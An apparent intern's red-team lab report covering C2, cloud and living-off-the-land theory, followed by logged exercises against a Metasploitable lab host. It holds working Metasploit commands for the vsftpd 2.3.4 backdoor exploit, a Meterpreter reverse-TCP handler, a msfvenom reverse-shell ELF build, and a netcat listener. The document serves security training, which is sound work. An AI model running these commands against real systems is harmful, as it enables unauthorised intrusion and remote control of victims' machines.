# 🔴 Week 4 - CYART Red Teaming Internship

---

## 🧠 Theoretical Knowledge

### 1. Advanced Command & Control (C2) Frameworks
- **Core Concepts:** C2 architecture for managing compromised hosts, stealthy communication via HTTPS/DNS, payload customization for specific environments.
- **MITRE ATT&CK:** T1071 (Application Layer Protocol)
- **Resources:** Cobalt Strike docs, PoshC2 on GitHub, CISA Volt Typhoon 2024 report, MITRE ATT&CK C2 techniques

### 2. Cloud Environment Attacks
- **Core Concepts:** Cloud recon for AWS/Azure/GCP misconfigurations, IAM privilege escalation, covert data exfiltration from cloud services.
- **MITRE ATT&CK:** T1580 (Cloud Infrastructure Discovery), T1078.004 (Valid Accounts: Cloud Accounts), T1537 (Transfer Data to Cloud Account)
- **Resources:** AWS Security docs, Pacu / CloudGoat (RhinoSecurityLabs), OWASP Cloud Security Top 10

### 3. Adversary Emulation & Threat Simulation
- **Core Concepts:** Replicating TTPs of known threat actors (e.g., APT29), red-blue team interaction using Caldera, multi-phase campaign planning (recon to exfiltration).
- **MITRE ATT&CK:** T1583 (Acquire Infrastructure), T1650 (Adversary-in-the-Middle)
- **Resources:** MITRE ATT&CK Navigator, Caldera framework, Mandiant Sandworm 2024 report

### 4. Advanced Reporting & Debriefing
- **Core Concepts:** PTES-compliant reports with CVSS scores and TTP mappings, stakeholder communication for technical and non-technical audiences, metrics/KPIs (e.g., phishing click-through rates).
- **Resources:** PTES guidelines (pentest-standard.org), SANS red team report templates, TryHackMe/HackTheBox sample reports

### 5. Native Tool Abuse (Living-Off-the-Land)
- **Core Concepts:** Using built-in tools (PowerShell, WMI, cmd.exe) for fileless execution, process injection into legitimate processes, credential harvesting via native utilities.
- **MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1055 (Process Injection), T1003 (OS Credential Dumping)
- **Resources:** LOLBAS Project, PowerSploit on GitHub, FireEye FIN7 2024 report

---

## 🟢 Practical Implementation

### 1. C2 Handler Setup
**Tools:** Metasploit  
**Commands:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.30.130
set LPORT 4444
run
```
**Session Log:**

| Session ID | Target IP       | Payload Type        | Notes              |
|------------|-----------------|---------------------|--------------------|
| SID001     | 192.168.30.129  | Meterpreter Rev TCP | Handler listening  |

**Summary:** A Metasploit multi/handler was configured as a C2 server listening for reverse TCP connections. This simulates real-world attacker infrastructure used to maintain persistent access, manage sessions, and execute post-exploitation commands on compromised systems.

---

### 2. Reconnaissance (Nmap)
**Tools:** Nmap  
**Command:**
```bash
nmap 192.168.30.129
```
**Findings:**

| Phase | Tool | Action    | Result                              |
|-------|------|-----------|-------------------------------------|
| Recon | Nmap | Port Scan | FTP, MySQL, VNC and other ports open |

**Summary:** Nmap port scanning was performed against the target to identify open services and potential attack surfaces. Discovered services including FTP (VSFTPD), MySQL, and VNC guided exploitation planning in subsequent phases of the engagement.

---

### 3. Exploitation — VSFTPD 2.3.4 Backdoor
**Tools:** Metasploit  
**Commands:**
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.30.129
set LHOST 192.168.30.130
run
```
**Finding:**

| Finding ID | TTP             | CVSS Score | Vulnerability         | Remediation           |
|------------|-----------------|------------|----------------------|-----------------------|
| FID001     | T1190 (Exploit) | 9.8        | VSFTPD 2.3.4 Backdoor | Patch / upgrade VSFTPD |

**Summary:** The known VSFTPD 2.3.4 backdoor vulnerability was exploited using Metasploit, granting unauthorized shell access to the target. This demonstrates how unpatched legacy services provide trivial entry points for attackers during real-world engagements.

---

### 4. Meterpreter Post-Exploitation Session
**Commands:**
```bash
getuid
pwd
sysinfo
```
**Summary:** A Meterpreter session was established after successful exploitation, confirming root-level access. Post-exploitation activities verified user privileges and gathered system information, simulating attacker behavior during the persistence and discovery phases of the attack lifecycle.

---

### 5. Payload Creation (msfvenom)
**Command:**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.30.130 LPORT=4444 -f elf > shell.elf
```
**Payload Log:**

| Payload ID | Type                    | AV Detection | Notes                   |
|------------|-------------------------|--------------|-------------------------|
| PID001     | Linux Meterpreter Rev TCP | Tested     | ELF binary generated    |

**Summary:** A reverse shell ELF payload was generated using msfvenom targeting a Linux x86 system. Payload generation is a core evasion and persistence technique, enabling attackers to deliver and execute custom implants tailored to the target environment.

---

### 6. Reverse Shell — Netcat Listener
**Commands:**
```bash
nc -lvnp 4444
```
**Summary:** A Netcat listener was established to receive a reverse shell from the target system. This simulates real-world scenarios where attackers maintain access post-exploitation using lightweight, native tools that are less likely to trigger AV or IDS detections.

---

### 7. Cloud Attack Simulation (AWS CLI)
**Tools:** AWS CLI  
**Command:**
```bash
aws --version
```
**Asset Log:**

| Asset ID | Service | Misconfiguration    | Notes                      |
|----------|---------|---------------------|----------------------------|
| AID001   | S3      | Public read access  | Simulated vulnerable bucket |
| AID002   | IAM     | Overprivileged role | Simulated privilege escalation |

**Summary:** AWS CLI was used to simulate cloud reconnaissance activities, demonstrating how attackers enumerate misconfigured S3 buckets and IAM roles in cloud environments. This exercise highlights the risks of improper cloud permissions and access control misconfigurations.

---

### 8. Automated Attack Orchestration
**Tools:** Caldera / Metasploit  
**Orchestration Log:**

| Phase       | TTP   | Tool Used  | Notes                   |
|-------------|-------|------------|-------------------------|
| Recon       | T1580 | Pacu       | S3 bucket enumeration   |
| Exploitation| T1190 | Metasploit | Remote code execution   |
| Persistence | T1071 | Meterpreter| C2 session established  |

**Summary:** A multi-stage attack simulation was performed automating the full chain from reconnaissance through exploitation to C2 establishment. Automated attack orchestration demonstrates how modern threat actors chain techniques efficiently to reduce dwell time and increase impact.

---

### 9. Capstone Project — Full Adversary Simulation
**Phases:** Recon → Exploit → Shell → C2 Control

**Campaign Log:**

| Phase       | Tool Used  | Action Description         | MITRE Technique |
|-------------|------------|----------------------------|-----------------|
| Recon       | Nmap       | Port and service scan       | T1046           |
| Exploitation| Metasploit | VSFTPD backdoor exploit     | T1190           |
| Shell       | Netcat     | Reverse shell established  | T1059           |
| C2 Control  | Meterpreter| Session managed, sysinfo   | T1071           |

**Summary:** A complete red team attack lifecycle was executed against a Metasploitable lab environment, covering scanning, exploitation, payload delivery, and remote shell access. This capstone demonstrates practical proficiency in offensive security techniques and the full adversary simulation process.

---

## 📊 Lab Logs

| Phase   | Tool       | Action            | Result                    |
|---------|------------|-------------------|---------------------------|
| Recon   | Nmap       | Port scan         | Open ports found          |
| Exploit | Metasploit | VSFTPD exploit    | Root access gained        |
| Shell   | Netcat     | Reverse shell     | Connection established    |
| C2      | Meterpreter| Session control   | Post-exploitation done    |
| Cloud   | AWS CLI    | S3/IAM enum       | Misconfigurations found   |

---

## 📝 PTES-Compliant Report Summary

**Executive Summary:**  
This week's red team engagement against a lab environment (Metasploitable) successfully demonstrated a full attack lifecycle. Critical vulnerabilities including an unpatched VSFTPD backdoor and simulated cloud misconfigurations were identified and exploited. Immediate remediation is recommended.

**Key Findings:**

| Finding ID | TTP                    | CVSS Score | Remediation               |
|------------|------------------------|------------|---------------------------|
| FID001     | T1190 – VSFTPD Backdoor | 9.8       | Patch / replace VSFTPD    |
| FID002     | T1580 – Cloud Recon    | 7.5        | Restrict S3 bucket access |
| FID003     | T1078.004 – IAM Abuse  | 8.1        | Enforce least privilege   |

**Recommendations:** Patch legacy services, enforce MFA, apply least-privilege IAM policies, and implement network segmentation to limit lateral movement.

---

## 🧠 Overall Summary

This week demonstrated real-world red teaming techniques including reconnaissance, exploitation, payload creation, cloud attack simulation, and reverse shell access. Tools including Nmap, Metasploit, msfvenom, Netcat, and AWS CLI were used to simulate a complete attack lifecycle in a controlled lab environment, reinforcing practical offensive security skills.

---

## ✅ Learning Outcomes

- Practical penetration testing skills using industry-standard tools
- Understanding of the full adversary attack lifecycle (recon → exploit → C2 → exfil)
- Hands-on experience with Metasploit, Netcat, msfvenom, and AWS CLI
- Knowledge of MITRE ATT&CK technique mapping and CVSS scoring
- Exposure to cloud attack vectors and IAM misconfiguration exploitation
- Professional red team reporting following PTES guidelines
